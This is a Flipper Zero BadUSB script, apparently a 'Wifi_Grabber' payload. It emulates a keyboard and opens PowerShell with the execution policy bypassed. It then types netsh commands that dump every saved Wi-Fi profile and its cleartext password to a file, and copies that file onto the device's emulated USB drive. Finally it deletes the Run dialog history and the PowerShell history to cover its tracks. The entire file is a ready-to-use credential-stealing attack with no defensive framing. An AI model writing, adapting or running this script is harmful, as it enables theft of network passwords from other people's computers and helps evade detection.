// MassStorage Name
let image = "/ext/apps_data/mass_storage/Wifi_Grabber.img";
// MassStorage Size
let size = 8 * 1024 * 1024 * 20;

// Script
let script = [
    "$deviceName = whoami",
    "$Date = Get-Date -Format yyyy-MM-dd",
    "$Time = Get-Date -Format hh-mm-ss",
    "$filename = \"wifi.txt\"",
    "$profiles = netsh wlan show profiles | Select-String \"All User Profile\" | ForEach-Object {($_ -split \":\")[1].Trim()}",
    "$output = \"\"",
    "foreach ($profile in $profiles) { $output += \"Wi-Fi Profile: $profile`n\"",
    "$key = netsh wlan show profile $profile key=clear | Select-String \"Key Content\" | ForEach-Object {($_ -split \":\")[1].Trim()}; $output += \"Password: $key`n\" }",
    "$output | Out-File $filename",
];

// Requirements
let badusb = require("badusb");
let usbdisk = require("usbdisk");
let storage = require("storage");

// Check if MassStorage image Exists...
print("Checking for Image...");
if (storage.fileExists(image)) {
    print("Storage Exists.");
}
// Create MassStorage in case it doesnt exists
else {
    print("Creating Storage...");
    usbdisk.createImage(image, size);
}

// VID&PID as HID
badusb.setup({ vid: 0xAAAA, pid: 0xBBBB, mfrName: "Flipper", prodName: "Zero", layoutPath: "/ext/badusb/assets/layouts/en-US.kl" });
print("Waiting for connection");

// Keep Connected
while (!badusb.isConnected()) {
    delay(1000);
}

// Open Powershell
badusb.press("GUI", "r");// Open admin tools menu
delay(600);
badusb.println("powershell -NoProfile -ExecutionPolicy Bypass");
delay(600);

// Start Script
print("Starting Script...");
for(let i = 0; i < script.length; i++) {
    badusb.println(script[i]);
}
delay(600);

// Copying to the flipper, then delete the run dialog and PowerShell history for a clean
badusb.println("echo 'Please wait until this Window closes to eject the disk!'; Start-Sleep 10; $DriveLetter = Get-Disk -FriendlyName 'Flipper Mass Storage' | Get-Partition | Get-Volume | Select-Object -ExpandProperty DriveLetter; New-Item -ItemType Directory -Force -Path ${DriveLetter}:\\${Date}\\; Move-Item -Path $filename -Destination ${DriveLetter}:\\${Date}\\${env:computername}_${Time}.txt; Remove-Item $filename; reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue ;exit")
badusb.quit();
delay(2000);

// Open MassStorage Folder
usbdisk.start(image);
print("Please wait until powershell window closes to eject...");

// Ejected check
while (!usbdisk.wasEjected()) {
    delay(1000);
}

// Stop Script
usbdisk.stop();
print("Done");